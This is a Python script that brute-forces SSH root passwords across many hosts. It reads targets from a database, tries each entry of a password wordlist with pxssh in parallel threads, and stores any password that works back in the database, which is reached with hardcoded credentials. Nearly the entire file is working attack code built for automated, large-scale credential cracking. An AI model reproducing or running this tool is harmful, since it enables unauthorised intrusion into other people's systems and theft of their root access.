#!/usr/bin/python3
# coding: utf-8
'''
暴力破解ssh，root用户的密码，线程池
'''
from pexpect import pxssh
from threading import *
from databaseHelper import DatabaseHelper

PASSWORDFILE = 'password.txt'

class CrackSSHWorkInfo:
  def __init__(self, id, host, user='root'):
    self._user = user
    self._host = host
    self._id = id
    self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
    
  def _checkPassword(self, password):
    try:
      s = pxssh.pxssh()
      s.login(self._host, self._user, password)
    except Exception as e:
      print('[-] Login Fail..., ErrorInfo: {0}'.format(e))
      return False
    finally:
      s.logout()
    return True

  def _saveWorkInfo(self, password):
    self.dbHelper.nonQuery('update crackResult set password = %s, crackState = %s where id = %s', (password, ENDCRACK, self._id))

  def workThread(self, lock):
    self.dbHelper.nonQuery('update crackResult set crackState = %s where id = %s', (CRACKING, self._id))
    with open(PASSWORDFILE, 'r') as f:
      for line in f:
        line = line.strip('\n').strip()
        if self._checkPassword(line):
          self._saveWorkInfo(line)
          break
      else:
        self.dbHelper.nonQuery('update crackResult set crackState = %s where id = %s', (ENDCRACK, self._id))
    
class CrackSSHThreadPool:
  def __init__(self, count):
    self.threadLock = BoundedSemaphore(value=count)
    self._schedule = SSHScheduler()

  def startThreadPool(self):
    while True:
      self.threadLock.acquire()
      workInfo = self._schedule.getNextWork()
      if workInfo == None:
        self.threadLock.release()
        continue
      t = Thread(target= workInfo.workThread, args=(self.threadLock,))
      t.start()

class SSHScheduler:
  def __init__(self):
    self.dbHelper = DatabaseHelper('192.168.1.102', 'crack_ssh', 'root', '123456')
  
  def getNextWork(self):
    dictResult = self.dbHelper.queryOne('select id, host from crackResult where state = %s and password is null and crackState = %s', ('open', NOSTART))
    if dictResult == None:
      return None
    return CrackSSHWorkInfo(dictResult['id'], dictResult['host'])

    
NOSTART = 0
CRACKING = 1
ENDCRACK = 2

if __name__ == '__main__':
  csPool = CrackSSHThreadPool(10)
  csPool.startThreadPool()

